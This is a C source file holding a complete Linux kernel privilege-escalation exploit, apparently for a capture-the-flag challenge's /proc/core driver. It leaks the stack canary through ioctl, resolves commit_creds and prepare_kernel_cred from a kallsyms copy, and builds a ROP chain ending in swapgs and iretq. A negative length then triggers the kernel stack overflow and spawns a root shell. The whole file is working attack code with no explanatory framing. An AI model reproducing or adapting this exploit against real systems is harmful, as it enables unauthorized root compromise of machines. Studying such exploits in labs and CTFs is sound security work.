#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

unsigned long long commit_cred_addr;
unsigned long long prepare_kernel_cred_addr;
unsigned long long ret_addr;
unsigned long long user_cs, user_ss, user_rsp, user_flag;
unsigned long long name_payload[25];

void get_shell()
{
    system("/bin/sh");
}
void build_rop(unsigned long long canary)
{
    unsigned long long commit_cred_offset = 0x9c8e0; // 0xffffffffa409c8e0-0xffffffffa4000000=0x9c8e0 get from kallsyms
    unsigned long long kernel_base_addr = commit_cred_addr - commit_cred_offset;

#define vmlinux_offset(x) (x - 0xffffffff81000000)

    memset(name_payload,0x90,sizeof(name_payload));
    name_payload[8] = canary;
    name_payload[10] = kernel_base_addr + vmlinux_offset(0xffffffff81000b2f); // 0xffffffff81000b2f : pop rdi ; ret
    name_payload[11] = 0;//rdi=0 after pop rid
    name_payload[12] = prepare_kernel_cred_addr;//ret will triger to excute this function
    name_payload[13] = kernel_base_addr + vmlinux_offset(0xffffffff810a0f49);//ret-addr of prepare_kernel_cred_addr,0xffffffff810a0f49 : pop rdx ; ret;
    name_payload[14] = commit_cred_addr;//we put commit_cred_addr into rdx, after move rdi,rax, then call rdx or jmp rdx
    name_payload[15] = kernel_base_addr + vmlinux_offset(0xffffffff81735dc1);//0xffffffff81735dc1 : pop r15 ; mov rdi, rax ; jmp rdx
    name_payload[16] = 0x90;//this is for pop r15, we don't care
    name_payload[17] = kernel_base_addr + vmlinux_offset(0xffffffff81a012da);//return from commit_cred_addr, we are in root state: 0xffffffff81a012da : swapgs ; popfq ; ret
    name_payload[18] = 0x90;//this is for popfq, we don't care
    name_payload[19] = kernel_base_addr + vmlinux_offset(0xffffffff81050ac2);//0xffffffff81050ac2: iretq; ret;
    name_payload[20] = &get_shell;//return_addr rip for iretq
    name_payload[21] = user_cs; //code seg for iretq
    name_payload[22] = user_flag;//flag register for iretq
    name_payload[23] = user_rsp;//rsp  for iretq
    name_payload[24] = user_ss;//stack seg for iretq
}

void save_status()
{
    // pushf-->push flag into stack
    // then use pop user_flag to get current flag
    asm("mov %%cs,%0":"=r"(user_cs));
    asm("mov %%ss,%0":"=r"(user_ss));
    asm("mov %%rsp,%0":"=r"(user_rsp));
    asm("pushf\n"
        "pop %0"
        :"=r"(user_flag)    
    );

    printf("user_cs:0x%016llx\n", user_cs);
    printf("user_ss:0x%016llx\n", user_ss);
    printf("user_rsp:0x%016llx\n", user_rsp);
    printf("user_flag:0x%016llx\n", user_flag);
}

unsigned long long get_kernel_func_addr(char *cmd)
{
    char buf[64];
    memset(buf, 0, sizeof(buf));
    FILE *fp = popen(cmd, "r");
    fgets(buf, sizeof(buf), fp);
    return strtoul(buf, NULL, 16);
}
unsigned long long get_commit_cred_addr()
{
    char *cmd = "cat /tmp/kallsyms |grep commit_cred|awk '{print $1}'";
    return get_kernel_func_addr(cmd);
}
unsigned long long get_prepare_kernel_cred_addr()
{
    char *cmd = "cat /tmp/kallsyms |grep prepare_kernel_cred|awk '{print $1}'";
    return get_kernel_func_addr(cmd);
}

int main(int argc, char **argv)
{
    int fd = open("/proc/core", O_RDWR);
    unsigned long long buf[64];

    unsigned int off_set_cmd = 0x6677889C;
    unsigned int read_cmd = 0x6677889B;
    unsigned int core_copy_func_cmd = 0x6677889A;

    // first setting off = 64
    int off = 64;
    ioctl(fd, off_set_cmd, 64);

    // call read to leak canary
    ioctl(fd, read_cmd, buf);

    for (int i = 0; i < 64; i++)
    {
        printf("%016llx ", buf[i]);
    }
    printf("\n");
    unsigned long long canary = buf[0];
    ret_addr = buf[2];
    printf("get canay is:%016llx\n", canary);

    // set commit_cred and prepare_kernel_cred address
    commit_cred_addr = get_commit_cred_addr();
    prepare_kernel_cred_addr = get_prepare_kernel_cred_addr();
    printf("commit_cred:%016llx\n", commit_cred_addr);
    printf("prepare_kernel_cred:%016llx\n", prepare_kernel_cred_addr);
    printf("sizeof name_payload:%d\n",sizeof(name_payload));

    //use rop to get root shell
    save_status();
    build_rop(canary);
    // set name
    
    write(fd, name_payload, sizeof(name_payload));

    // triger stack mash and excute shellcode to promote to root
    long long len = -65336;//unsinged short len ==200=8*25 which is size of name_payload
    ioctl(fd, core_copy_func_cmd, len);

    return 0;
}
